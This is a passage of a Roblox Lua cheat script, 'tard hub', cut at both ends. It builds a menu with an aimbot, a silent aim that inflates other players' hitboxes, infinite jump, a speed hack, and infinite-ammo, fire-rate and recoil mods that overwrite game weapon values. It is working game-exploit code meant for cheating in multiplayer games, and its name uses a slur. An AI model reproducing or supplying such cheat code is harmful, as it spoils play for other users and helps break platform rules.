quotasloader.Position = UDim2.new(0.123442277, 0, 0.157894731, 0)
quotasloader.Size = UDim2.new(0, 154, 0, 39)
quotasloader.Font = Enum.Font.JosefinSans
quotasloader.Text = "\"tard hub\""
quotasloader.TextColor3 = Color3.fromRGB(93, 255, 255)
quotasloader.TextSize = 20.000
quotasloader.TextWrapped = true
quotasloader.TextTransparency = 1

Bar.Name = "Bar"
Bar.Parent = Loader
Bar.BackgroundColor3 = Color3.fromRGB(93, 84, 84)
Bar.BorderColor3 = Color3.fromRGB(0, 0, 0)
Bar.BorderSizePixel = 0
Bar.Position = UDim2.new(0.128272906, 0, 0.75, 0)
Bar.Size = UDim2.new(0, 154, 0, 6)
Bar.Active = true
Bar.BackgroundTransparency = 1

UICorner_3.Parent = Bar

Loaded.Name = "Loaded"
Loaded.Parent = Loader
Loaded.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
Loaded.BorderColor3 = Color3.fromRGB(0, 0, 0)
Loaded.BorderSizePixel = 0
Loaded.Position = UDim2.new(0.123441979, 0, 0.75, 0)
Loaded.Size = UDim2.new(0, 0, 0, 6)
Loaded.Active = true

UICorner_4.Parent = Loaded

local popup = ts:Create(Loader, TweenInfo.new(2), {Size = UDim2.new(0, 207, 0, 76)})
popup:Play()

local popup2 = ts:Create(Blur, TweenInfo.new(2), {Size = UDim2.new(0, 207, 0, 76)})
popup2:Play()

wait(1)

local pop = ts:Create(quotasloader, TweenInfo.new(1), {TextTransparency = 0})
pop:Play()

wait(0.2)

local pop2 = ts:Create(Bar, TweenInfo.new(1), {BackgroundTransparency = 0})
pop2:Play()

local Loading = ts:Create(Loaded, TweenInfo.new(2), {Size = UDim2.new(0, 97, 0, 6)})
Loading:Play()

wait(1.3)

local Loading2 = ts:Create(Loaded, TweenInfo.new(3.2), {Size = UDim2.new(0, 154, 0, 6)})
Loading2:Play()

wait(4.2)

local Loading2 = ts:Create(Loaded, TweenInfo.new(3.2), {Size = UDim2.new(0, 154, 0, 6)})
Loading2:Play()

wait(1.2)

local dis1 = ts:Create(Blur, TweenInfo.new(1), {ImageTransparency = 1})
dis1:Play()

local dis2 = ts:Create(Loader, TweenInfo.new(1), {BackgroundTransparency = 1})
dis2:Play()

local dis3 = ts:Create(Bar, TweenInfo.new(1), {BackgroundTransparency = 1})
dis3:Play()

local dis4 = ts:Create(Loaded, TweenInfo.new(1), {BackgroundTransparency = 1})
dis4:Play()

wait(0.2)

local trans = ts:Create(quotasloader, TweenInfo.new(1.5), {TextTransparency = 1})
trans:Play()

Loader.Visible = false

local ping = Instance.new("TextLabel")
local Basic = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Blurry = Instance.new("ImageLabel")
local UICorner_2 = Instance.new("UICorner")
local Title = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local quotasname = Instance.new("TextLabel")
local Blurred = Instance.new("ImageLabel")
local UICorner_4 = Instance.new("UICorner")
local EspEnable = Instance.new("ImageButton")
local TeamCheck = Instance.new("ImageButton")
local AimEnable = Instance.new("ImageButton")
local TeamText = Instance.new("TextLabel")
local TeamCheck2 = Instance.new("ImageButton")
local TeamText2 = Instance.new("TextLabel")
local NameTogle = Instance.new("ImageButton")
local Namet = Instance.new("TextLabel")
local Close = Instance.new("ImageButton")
local UICorner_5 = Instance.new("UICorner")
local Mini = Instance.new("ImageButton")
local UICorner_6 = Instance.new("UICorner")
local line = Instance.new("ImageLabel")
local EspText = Instance.new("TextLabel")
local AimbotText = Instance.new("TextLabel")
local InfJump = Instance.new("ImageButton")
local InfText = Instance.new("TextLabel")
local Bottom = Instance.new("Frame")
local Yayy = Instance.new("UICorner")
local Effect = Instance.new("ImageLabel")
local newfr = Instance.new("UICorner")
local GunsM = Instance.new("ImageButton")
local meo = Instance.new("UICorner")
local SilentAim = Instance.new("ImageButton")
local SilentText = Instance.new("TextLabel")
local SpeedText = Instance.new("TextLabel")
local SpeedHack = Instance.new("ImageButton")
local Mods = Instance.new("Frame")
local cawd = Instance.new("UICorner")
local Title_2 = Instance.new("Frame")
local wacd = Instance.new("UICorner")
local ModName = Instance.new("TextLabel")
local abcblur = Instance.new("ImageLabel")
local UICorner_7 = Instance.new("UICorner")
local bloor = Instance.new("ImageLabel")
local UICorner_8 = Instance.new("UICorner")
local InfAmmo = Instance.new("ImageButton")
local AmmoText = Instance.new("TextLabel")
local FFSpeed = Instance.new("ImageButton")
local FFSpeedText = Instance.new("TextLabel")
local Recoil = Instance.new("ImageButton")
local RecoilText = Instance.new("TextLabel")
local Close_2 = Instance.new("ImageButton")
local UICorner_9 = Instance.new("UICorner")

ping.Name = "ping"
ping.Parent = Main
ping.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
ping.BackgroundTransparency = 1.000
ping.BorderColor3 = Color3.fromRGB(0, 0, 0)
ping.BorderSizePixel = 0
ping.Position = UDim2.new(0.409000009, 0, 0, 0)
ping.Size = UDim2.new(0, 329, 0, 62)
ping.Font = Enum.Font.JosefinSans
ping.Text = "\"rightshift\" to open menu"
ping.TextColor3 = Color3.fromRGB(93, 255, 255)
ping.TextSize = 22.000
ping.TextStrokeTransparency = 0.000
ping.TextTransparency = 1.000

Basic.Name = "Basic"
Basic.Parent = Main
Basic.Active = true
Basic.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Basic.BackgroundTransparency = 0.200
Basic.BorderColor3 = Color3.fromRGB(0, 0, 0)
Basic.BorderSizePixel = 0
Basic.Draggable = true
Basic.Position = UDim2.new(0.400606066, 0, 0.381736517, 0)
Basic.Size = UDim2.new(0, 329, 0, 221)

UICorner.Parent = Basic

Blurry.Name = "Blurry"
Blurry.Parent = Basic
Blurry.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Blurry.BackgroundTransparency = 1.000
Blurry.BorderColor3 = Color3.fromRGB(0, 0, 0)
Blurry.BorderSizePixel = 0
Blurry.Position = UDim2.new(-0.00483086752, 0, 0, 0)
Blurry.Size = UDim2.new(0, 330, 0, 221)
Blurry.Image = "http://www.roblox.com/asset/?id=6758962034"
Blurry.ImageTransparency = 0.550

UICorner_2.Parent = Blurry

Title.Name = "Title"
Title.Parent = Basic
Title.BackgroundColor3 = Color3.fromRGB(95, 95, 95)
Title.BackgroundTransparency = 0.350
Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title.BorderSizePixel = 0
Title.Draggable = true
Title.Position = UDim2.new(-0.00483086752, 0, 0, 0)
Title.Size = UDim2.new(0, 331, 0, 24)

UICorner_3.Parent = Title

quotasname.Name = "quotasname"
quotasname.Parent = Title
quotasname.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
quotasname.BackgroundTransparency = 1.000
quotasname.BorderColor3 = Color3.fromRGB(0, 0, 0)
quotasname.BorderSizePixel = 0
quotasname.Position = UDim2.new(0, 0, -0.000333150238, 0)
quotasname.Size = UDim2.new(0, 329, 0, 25)
quotasname.Font = Enum.Font.JosefinSans
quotasname.Text = "\"tard hub gg/MQxgq6DPXs\""
quotasname.TextColor3 = Color3.fromRGB(93, 255, 255)
quotasname.TextSize = 14.000
quotasname.TextWrapped = true

Blurred.Name = "Blurred"
Blurred.Parent = Title
Blurred.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Blurred.BackgroundTransparency = 1.000
Blurred.BorderColor3 = Color3.fromRGB(0, 0, 0)
Blurred.BorderSizePixel = 0
Blurred.Position = UDim2.new(-0.00178288843, 0, 0, 0)
Blurred.Size = UDim2.new(0, 332, 0, 24)
Blurred.Image = "http://www.roblox.com/asset/?id=6758962034"
Blurred.ImageTransparency = 0.550

UICorner_4.Parent = Blurred

EspEnable.Name = "EspEnable"
EspEnable.Parent = Basic
EspEnable.BackgroundColor3 = Color3.fromRGB(148, 148, 148)
EspEnable.BackgroundTransparency = 1.000
EspEnable.BorderColor3 = Color3.fromRGB(0, 0, 0)
EspEnable.BorderSizePixel = 0
EspEnable.Position = UDim2.new(0.258358657, 0, 0.244164556, 0)
EspEnable.Size = UDim2.new(0, 16, 0, 16)
EspEnable.Image = "http://www.roblox.com/asset/?id=1264513374"

TeamCheck.Name = "TeamCheck"
TeamCheck.Parent = Basic
TeamCheck.BackgroundColor3 = Color3.fromRGB(148, 148, 148)
TeamCheck.BackgroundTransparency = 1.000
TeamCheck.BorderColor3 = Color3.fromRGB(0, 0, 0)
TeamCheck.BorderSizePixel = 0
TeamCheck.Position = UDim2.new(0.258358657, 0, 0.430164546, 0)
TeamCheck.Size = UDim2.new(0, 16, 0, 16)
TeamCheck.Image = "http://www.roblox.com/asset/?id=1264513374"

AimEnable.Name = "AimEnable"
AimEnable.Parent = Basic
AimEnable.BackgroundColor3 = Color3.fromRGB(148, 148, 148)
AimEnable.BackgroundTransparency = 1.000
AimEnable.BorderColor3 = Color3.fromRGB(0, 0, 0)
AimEnable.BorderSizePixel = 0
AimEnable.Position = UDim2.new(0.742358685, 0, 0.245164558, 0)
AimEnable.Size = UDim2.new(0, 16, 0, 16)
AimEnable.Image = "http://www.roblox.com/asset/?id=1264513374"

TeamText.Name = "TeamText"
TeamText.Parent = Basic
TeamText.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
TeamText.BackgroundTransparency = 1.000
TeamText.BorderColor3 = Color3.fromRGB(0, 0, 0)
TeamText.BorderSizePixel = 0
TeamText.Position = UDim2.new(0.450395137, 0, 0.424177229, 0)
TeamText.Size = UDim2.new(0, 111, 0, 23)
TeamText.Font = Enum.Font.JosefinSans
TeamText.Text = "team check"
TeamText.TextColor3 = Color3.fromRGB(93, 255, 255)
TeamText.TextSize = 10.000

TeamCheck2.Name = "TeamCheck2"
TeamCheck2.Parent = Basic
TeamCheck2.BackgroundColor3 = Color3.fromRGB(148, 148, 148)
TeamCheck2.BackgroundTransparency = 1.000
TeamCheck2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TeamCheck2.BorderSizePixel = 0
TeamCheck2.Position = UDim2.new(0.742358685, 0, 0.431164563, 0)
TeamCheck2.Size = UDim2.new(0, 16, 0, 16)
TeamCheck2.Image = "http://www.roblox.com/asset/?id=1264515756"

TeamText2.Name = "TeamText2"
TeamText2.Parent = Basic
TeamText2.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
TeamText2.BackgroundTransparency = 1.000
TeamText2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TeamText2.BorderSizePixel = 0
TeamText2.Position = UDim2.new(-0.0303951371, 0, 0.418177217, 0)
TeamText2.Size = UDim2.new(0, 111, 0, 23)
TeamText2.Font = Enum.Font.JosefinSans
TeamText2.Text = "team check"
TeamText2.TextColor3 = Color3.fromRGB(93, 255, 255)
TeamText2.TextSize = 10.000

NameTogle.Name = "NameTogle"
NameTogle.Parent = Basic
NameTogle.BackgroundColor3 = Color3.fromRGB(148, 148, 148)
NameTogle.BackgroundTransparency = 1.000
NameTogle.BorderColor3 = Color3.fromRGB(0, 0, 0)
NameTogle.BorderSizePixel = 0
NameTogle.Position = UDim2.new(0.258358657, 0, 0.610164583, 0)
NameTogle.Size = UDim2.new(0, 16, 0, 16)
NameTogle.Image = "http://www.roblox.com/asset/?id=1264515756"

Namet.Name = "Namet"
Namet.Parent = Basic
Namet.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
Namet.BackgroundTransparency = 1.000
Namet.BorderColor3 = Color3.fromRGB(0, 0, 0)
Namet.BorderSizePixel = 0
Namet.Position = UDim2.new(-0.0303951371, 0, 0.602177203, 0)
Namet.Size = UDim2.new(0, 111, 0, 23)
Namet.Font = Enum.Font.JosefinSans
Namet.Text = "draw fov"
Namet.TextColor3 = Color3.fromRGB(93, 255, 255)
Namet.TextSize = 10.000

Close.Name = "Close"
Close.Parent = Basic
Close.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
Close.BackgroundTransparency = 0.650
Close.BorderColor3 = Color3.fromRGB(0, 0, 0)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0.927358627, 0, 0.0253164563, 0)
Close.Size = UDim2.new(0, 16, 0, 16)
Close.Image = "http://www.roblox.com/asset/?id=10002373478"

UICorner_5.CornerRadius = UDim.new(0, 5)
UICorner_5.Parent = Close

Mini.Name = "Mini"
Mini.Parent = Basic
Mini.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
Mini.BackgroundTransparency = 0.650
Mini.BorderColor3 = Color3.fromRGB(0, 0, 0)
Mini.BorderSizePixel = 0
Mini.Position = UDim2.new(0.837358654, 0, 0.0253164563, 0)
Mini.Size = UDim2.new(0, 16, 0, 16)
Mini.Image = "http://www.roblox.com/asset/?id=848237313"

UICorner_6.CornerRadius = UDim.new(0, 5)
UICorner_6.Parent = Mini

line.Name = "line"
line.Parent = Basic
line.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
line.BackgroundTransparency = 1.000
line.BorderColor3 = Color3.fromRGB(0, 0, 0)
line.BorderSizePixel = 0
line.Position = UDim2.new(0.495440722, 0, 0.196202889, 0)
line.Size = UDim2.new(0, 33, 0, 147)
line.Image = "http://www.roblox.com/asset/?id=14519771515"

EspText.Name = "EspText"
EspText.Parent = Basic
EspText.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
EspText.BackgroundTransparency = 1.000
EspText.BorderColor3 = Color3.fromRGB(0, 0, 0)
EspText.BorderSizePixel = 0
EspText.Position = UDim2.new(-0.0303951371, 0, 0.234177217, 0)
EspText.Size = UDim2.new(0, 111, 0, 23)
EspText.Font = Enum.Font.JosefinSans
EspText.Text = "basic esp"
EspText.TextColor3 = Color3.fromRGB(93, 255, 255)
EspText.TextSize = 10.000

AimbotText.Name = "AimbotText"
AimbotText.Parent = Basic
AimbotText.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
AimbotText.BackgroundTransparency = 1.000
AimbotText.BorderColor3 = Color3.fromRGB(0, 0, 0)
AimbotText.BorderSizePixel = 0
AimbotText.Position = UDim2.new(0.450395137, 0, 0.231177211, 0)
AimbotText.Size = UDim2.new(0, 111, 0, 23)
AimbotText.Font = Enum.Font.JosefinSans
AimbotText.Text = "aimbot"
AimbotText.TextColor3 = Color3.fromRGB(93, 255, 255)
AimbotText.TextSize = 10.000

InfJump.Name = "InfJump"
InfJump.Parent = Basic
InfJump.BackgroundColor3 = Color3.fromRGB(148, 148, 148)
InfJump.BackgroundTransparency = 1.000
InfJump.BorderColor3 = Color3.fromRGB(0, 0, 0)
InfJump.BorderSizePixel = 0
InfJump.Position = UDim2.new(0.259076059, 0, 0.793481112, 0)
InfJump.Size = UDim2.new(0, 16, 0, 16)
InfJump.Image = "http://www.roblox.com/asset/?id=17397360339"

InfText.Name = "InfText"
InfText.Parent = Basic
InfText.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
InfText.BackgroundTransparency = 1.000
InfText.BorderColor3 = Color3.fromRGB(0, 0, 0)
InfText.BorderSizePixel = 0
InfText.Position = UDim2.new(-0.0332827121, 0, 0.777658224, 0)
InfText.Size = UDim2.new(0, 111, 0, 23)
InfText.Font = Enum.Font.JosefinSans
InfText.Text = "infinite jump"
InfText.TextColor3 = Color3.fromRGB(93, 255, 255)
InfText.TextSize = 10.000

Bottom.Name = "Bottom"
Bottom.Parent = Basic
Bottom.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Bottom.BackgroundTransparency = 0.200
Bottom.BorderColor3 = Color3.fromRGB(0, 0, 0)
Bottom.BorderSizePixel = 0
Bottom.Draggable = true
Bottom.Position = UDim2.new(-0.00787019543, 0, 1.03784513, 0)
Bottom.Size = UDim2.new(0, 331, 0, 31)

Yayy.Name = "Yayy"
Yayy.Parent = Bottom

Effect.Name = "Effect"
Effect.Parent = Bottom
Effect.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Effect.BackgroundTransparency = 1.000
Effect.BorderColor3 = Color3.fromRGB(0, 0, 0)
Effect.BorderSizePixel = 0
Effect.Position = UDim2.new(-0.00180053711, 0, 0, 0)
Effect.Size = UDim2.new(0, 331, 0, 30)
Effect.Image = "http://www.roblox.com/asset/?id=6758962034"
Effect.ImageTransparency = 0.550

newfr.Name = "newfr"
newfr.Parent = Effect

GunsM.Name = "GunsM"
GunsM.Parent = Bottom
GunsM.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
GunsM.BackgroundTransparency = 0.650
GunsM.BorderColor3 = Color3.fromRGB(0, 0, 0)
GunsM.BorderSizePixel = 0
GunsM.Position = UDim2.new(0.0814373121, 0, 0.129032254, 0)
GunsM.Size = UDim2.new(0, 76, 0, 22)
GunsM.Image = "http://www.roblox.com/asset/?id=17430191337"

meo.CornerRadius = UDim.new(0, 5)
meo.Name = "meo"
meo.Parent = GunsM

SilentAim.Name = "SilentAim"
SilentAim.Parent = Basic
SilentAim.BackgroundColor3 = Color3.fromRGB(148, 148, 148)
SilentAim.BackgroundTransparency = 1.000
SilentAim.BorderColor3 = Color3.fromRGB(0, 0, 0)
SilentAim.BorderSizePixel = 0
SilentAim.Position = UDim2.new(0.742358744, 0, 0.613827407, 0)
SilentAim.Size = UDim2.new(0, 16, 0, 16)
SilentAim.Image = "http://www.roblox.com/asset/?id=17397360339"

SilentText.Name = "SilentText"
SilentText.Parent = Basic
SilentText.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
SilentText.BackgroundTransparency = 1.000
SilentText.BorderColor3 = Color3.fromRGB(0, 0, 0)
SilentText.BorderSizePixel = 0
SilentText.Position = UDim2.new(0.449999958, 0, 0.599004567, 0)
SilentText.Size = UDim2.new(0, 111, 0, 23)
SilentText.Font = Enum.Font.JosefinSans
SilentText.Text = "tards silent aim"
SilentText.TextColor3 = Color3.fromRGB(93, 255, 255)
SilentText.TextSize = 10.000

SpeedText.Name = "SpeedText"
SpeedText.Parent = Basic
SpeedText.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
SpeedText.BackgroundTransparency = 1.000
SpeedText.BorderColor3 = Color3.fromRGB(0, 0, 0)
SpeedText.BorderSizePixel = 0
SpeedText.Position = UDim2.new(0.448801696, 0, 0.777553499, 0)
SpeedText.Size = UDim2.new(0, 111, 0, 23)
SpeedText.Font = Enum.Font.JosefinSans
SpeedText.Text = "speed hack"
SpeedText.TextColor3 = Color3.fromRGB(93, 255, 255)
SpeedText.TextSize = 10.000

SpeedHack.Name = "SpeedHack"
SpeedHack.Parent = Basic
SpeedHack.BackgroundColor3 = Color3.fromRGB(148, 148, 148)
SpeedHack.BackgroundTransparency = 1.000
SpeedHack.BorderColor3 = Color3.fromRGB(0, 0, 0)
SpeedHack.BorderSizePixel = 0
SpeedHack.Position = UDim2.new(0.741797566, 0, 0.790223122, 0)
SpeedHack.Size = UDim2.new(0, 16, 0, 16)
SpeedHack.Image = "http://www.roblox.com/asset/?id=17397360339"

Mods.Name = "Mods"
Mods.Parent = Main
Mods.Active = true
Mods.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Mods.BackgroundTransparency = 0.200
Mods.BorderColor3 = Color3.fromRGB(0, 0, 0)
Mods.BorderSizePixel = 0
Mods.Draggable = true
Mods.Position = UDim2.new(0.712401628, 0, 0.391192794, 0)
Mods.Size = UDim2.new(0, 183, 0, 221)
Mods.Visible = false

cawd.Name = "cawd"
cawd.Parent = Mods

Title_2.Name = "Title"
Title_2.Parent = Mods
Title_2.BackgroundColor3 = Color3.fromRGB(95, 95, 95)
Title_2.BackgroundTransparency = 0.350
Title_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title_2.BorderSizePixel = 0
Title_2.Draggable = true
Title_2.Position = UDim2.new(-0.00142020232, 0, 0, 0)
Title_2.Size = UDim2.new(0, 183, 0, 24)

wacd.Name = "wacd"
wacd.Parent = Title_2

ModName.Name = "ModName"
ModName.Parent = Title_2
ModName.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
ModName.BackgroundTransparency = 1.000
ModName.BorderColor3 = Color3.fromRGB(0, 0, 0)
ModName.BorderSizePixel = 0
ModName.Position = UDim2.new(-0.00955917314, 0, -0.000333150238, 0)
ModName.Size = UDim2.new(0, 184, 0, 25)
ModName.Font = Enum.Font.JosefinSans
ModName.Text = "\"weapon mods\""
ModName.TextColor3 = Color3.fromRGB(93, 255, 255)
ModName.TextSize = 14.000
ModName.TextWrapped = true

abcblur.Name = "abcblur"
abcblur.Parent = Title_2
abcblur.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
abcblur.BackgroundTransparency = 1.000
abcblur.BorderColor3 = Color3.fromRGB(0, 0, 0)
abcblur.BorderSizePixel = 0
abcblur.Position = UDim2.new(-0.00285597844, 0, 0, 0)
abcblur.Size = UDim2.new(0, 183, 0, 24)
abcblur.Image = "http://www.roblox.com/asset/?id=6758962034"
abcblur.ImageTransparency = 0.550

UICorner_7.Parent = abcblur

bloor.Name = "bloor"
bloor.Parent = Mods
bloor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
bloor.BackgroundTransparency = 1.000
bloor.BorderColor3 = Color3.fromRGB(0, 0, 0)
bloor.BorderSizePixel = 0
bloor.Position = UDim2.new(-0.00142020232, 0, 0, 0)
bloor.Size = UDim2.new(0, 183, 0, 221)
bloor.Image = "http://www.roblox.com/asset/?id=6758962034"
bloor.ImageTransparency = 0.550

UICorner_8.Parent = bloor

InfAmmo.Name = "InfAmmo"
InfAmmo.Parent = Mods
InfAmmo.BackgroundColor3 = Color3.fromRGB(148, 148, 148)
InfAmmo.BackgroundTransparency = 1.000
InfAmmo.BorderColor3 = Color3.fromRGB(0, 0, 0)
InfAmmo.BorderSizePixel = 0
InfAmmo.Position = UDim2.new(0.660391748, 0, 0.16782707, 0)
InfAmmo.Size = UDim2.new(0, 16, 0, 16)
InfAmmo.Image = "http://www.roblox.com/asset/?id=17397360339"

AmmoText.Name = "AmmoText"
AmmoText.Parent = Mods
AmmoText.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
AmmoText.BackgroundTransparency = 1.000
AmmoText.BorderColor3 = Color3.fromRGB(0, 0, 0)
AmmoText.BorderSizePixel = 0
AmmoText.Position = UDim2.new(0.100273088, 0, 0.152036086, 0)
AmmoText.Size = UDim2.new(0, 111, 0, 23)
AmmoText.Font = Enum.Font.JosefinSans
AmmoText.Text = "ammo mod"
AmmoText.TextColor3 = Color3.fromRGB(93, 255, 255)
AmmoText.TextSize = 10.000

FFSpeed.Name = "FFSpeed"
FFSpeed.Parent = Mods
FFSpeed.BackgroundColor3 = Color3.fromRGB(148, 148, 148)
FFSpeed.BackgroundTransparency = 1.000
FFSpeed.BorderColor3 = Color3.fromRGB(0, 0, 0)
FFSpeed.BorderSizePixel = 0
FFSpeed.Position = UDim2.new(0.660391748, 0, 0.317148328, 0)
FFSpeed.Size = UDim2.new(0, 16, 0, 16)
FFSpeed.Image = "http://www.roblox.com/asset/?id=17397360339"

FFSpeedText.Name = "FFSpeedText"
FFSpeedText.Parent = Mods
FFSpeedText.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
FFSpeedText.BackgroundTransparency = 1.000
FFSpeedText.BorderColor3 = Color3.fromRGB(0, 0, 0)
FFSpeedText.BorderSizePixel = 0
FFSpeedText.Position = UDim2.new(0.100273088, 0, 0.301357359, 0)
FFSpeedText.Size = UDim2.new(0, 111, 0, 23)
FFSpeedText.Font = Enum.Font.JosefinSans
FFSpeedText.Text = "firerate mod"
FFSpeedText.TextColor3 = Color3.fromRGB(93, 255, 255)
FFSpeedText.TextSize = 10.000

Recoil.Name = "Recoil"
Recoil.Parent = Mods
Recoil.BackgroundColor3 = Color3.fromRGB(148, 148, 148)
Recoil.BackgroundTransparency = 1.000
Recoil.BorderColor3 = Color3.fromRGB(0, 0, 0)
Recoil.BorderSizePixel = 0
Recoil.Position = UDim2.new(0.660391748, 0, 0.467148328, 0)
Recoil.Size = UDim2.new(0, 16, 0, 16)
Recoil.Image = "http://www.roblox.com/asset/?id=17397360339"

RecoilText.Name = "RecoilText"
RecoilText.Parent = Mods
RecoilText.BackgroundColor3 = Color3.fromRGB(93, 255, 255)
RecoilText.BackgroundTransparency = 1.000
RecoilText.BorderColor3 = Color3.fromRGB(0, 0, 0)
RecoilText.BorderSizePixel = 0
RecoilText.Position = UDim2.new(0.100273088, 0, 0.450357359, 0)
RecoilText.Size = UDim2.new(0, 111, 0, 23)
RecoilText.Font = Enum.Font.JosefinSans
RecoilText.Text = "recoil mod"
RecoilText.TextColor3 = Color3.fromRGB(93, 255, 255)
RecoilText.TextSize = 10.000

Close_2.Name = "Close"
Close_2.Parent = Mods
Close_2.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
Close_2.BackgroundTransparency = 0.650
Close_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Close_2.BorderSizePixel = 0
Close_2.Position = UDim2.new(0.861785054, 0, 0.016266698, 0)
Close_2.Size = UDim2.new(0, 16, 0, 16)
Close_2.Image = "http://www.roblox.com/asset/?id=10002373478"

UICorner_9.CornerRadius = UDim.new(0, 5)
UICorner_9.Parent = Close_2

wait(0.5)

Basic.Visible = true

local appear = ts:Create(Basic, TweenInfo.new(1.5), {BackgroundTransparency = 0.2})
appear:Play()

Close.MouseButton1Down:connect(function()
	Basic:Destroy()
end)

GunsM.MouseButton1Down:connect(function()
	Mods.Visible = true
end)

Close_2.MouseButton1Down:connect(function()
	Mods.Visible = false
end)

Recoil.MouseButton1Down:connect(function()
	local replicationstorage = game.ReplicatedStorage
 
	while wait(5) do
		
	for i, v in pairs(replicationstorage.Weapons:GetDescendants()) do
		if v.Name == "RecoilControl" then
			v.Value = 0
		end
		if v.Name == "MaxSpread" then
			v.Value = 0
		end

	end
end

end)

InfJump.MouseButton1Down:connect(function()
local InfiniteJumpEnabled = true

game:GetService("UserInputService").JumpRequest:Connect(function()
    if InfiniteJumpEnabled then
        game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
    end
end)
end)

SpeedHack.MouseButton1Down:connect(function()
	_G.WS = "100";
        local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid;
        Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
        Humanoid.WalkSpeed = _G.WS;
        end)
        Humanoid.WalkSpeed = _G.WS;
end)

FFSpeed.MouseButton1Down:connect(function()
	local replicationstorage = game.ReplicatedStorage
 
	while wait(5) do
		
	for i, v in pairs(replicationstorage.Weapons:GetDescendants()) do
		if v.Name == "Auto" then
			v.Value = true
		end
		if v.Name == "FireRate" then
			v.Value = 0.02
		end
	 end

	end
end)

SilentAim.MouseButton1Down:connect(function()
	function getplrsname()
		for i,v in pairs(game:GetChildren()) do
			if v.ClassName == "Players" then
				return v.Name
			end
		end
	end
	local players = getplrsname()
	local plr = game[players].LocalPlayer
	coroutine.resume(coroutine.create(function()
		while  wait(1) do
			coroutine.resume(coroutine.create(function()
				for _,v in pairs(game[players]:GetPlayers()) do
					if v.Name ~= plr.Name and v.Character then
						v.Character.RightUpperLeg.CanCollide = false
						v.Character.RightUpperLeg.Transparency = 10
						v.Character.RightUpperLeg.Size = Vector3.new(13,13,13)

						v.Character.LeftUpperLeg.CanCollide = false
						v.Character.LeftUpperLeg.Transparency = 10
						v.Character.LeftUpperLeg.Size = Vector3.new(13,13,13)

						v.Character.HeadHB.CanCollide = false
						v.Character.HeadHB.Transparency = 10
						v.Character.HeadHB.Size = Vector3.new(13,13,13)

						v.Character.HumanoidRootPart.CanCollide = false
						v.Character.HumanoidRootPart.Transparency = 10
						v.Character.HumanoidRootPart.Size = Vector3.new(13,13,13)

					end
				end
			end))
		end
	end))
end)

InfAmmo.MouseButton1Down:connect(function()
	local replicationstorage = game.ReplicatedStorage

while wait() do
    game:GetService("Players").LocalPlayer.PlayerGui.GUI.Client.Variables.ammocount.Value = 999
    game:GetService("Players").LocalPlayer.PlayerGui.GUI.Client.Variables.ammocount2.Value = 999
end
end)

local MenuIsToggled = true

Mini.MouseButton1Down:connect(function()
	Basic.Visible = false

    MenuIsToggled = false

	local minimize = ts:Create(ping, TweenInfo.new(1), {TextTransparency = 0})
	minimize:Play()

	wait(3)

	local unominimize = ts:Create(ping, TweenInfo.new(1), {TextTransparency = 1})
	unominimize:Play()

end)

uis.InputBegan:Connect(function (input)
	if input.KeyCode == Enum.KeyCode.RightShift then
		if MenuIsToggled == false then
		local reopen = ts:Create(Basic, TweenInfo.new(1.5), {Visible = true})
		reopen:Play()

		MenuIsToggled = true
	end
	end
end)

local toggled = false

EspEnable.MouseButton1Down:connect(function()
	if toggled == false then
		toggled = true
		EspEnable.Image = "http://www.roblox.com/asset/?id=1264515756"
	else do
			toggled = false
			EspEnable.Image = "http://www.roblox.com/asset/?id=1264513374"
			
		end
	end
end)

_G.sizeof = 55
_G.AimOn = false
_G.TeamCheckOn = true
_G.Aimpart = "Head"
_G.Sensitivity = 0.03
_G.CircleSides = 64
_G.CircleColor = Color3.fromRGB(255, 255, 255)
_G.CircleVisible = true
_G.fovTransparency = 0

AimEnable.MouseButton1Down:connect(function()
	if AimOn == false then
		AimOn = true
		_G.fovTransparency = 1
		AimEnable.Image = "http://www.roblox.com/asset/?id=1264515756"
	else do
		AimOn = false
		_G.fovTransparency = 0
		AimEnable.Image = "http://www.roblox.com/asset/?id=1264513374"
			
		end
	end
end)


local activated = false

TeamCheck.MouseButton1Down:connect(function()
	if activated == false then
		activated = true
		TeamCheck.Image = "http://www.roblox.com/asset/?id=1264515756"
	else do
		activated = false
			TeamCheck.Image = "http://www.roblox.com/asset/?id=1264513374"
			
		end
	end
end)

TeamCheck2.MouseButton1Down:connect(function()
	if _G.TeamCheckOn == false then
		_G.TeamCheckOn = true
		TeamCheck2.Image = "http://www.roblox.com/asset/?id=1264515756"
	else do
		_G.TeamCheckOn = false
			TeamCheck2.Image = "http://www.roblox.com/asset/?id=1264513374"
			
		end
	end
end)

NameTogle.MouseButton1Down:connect(function()
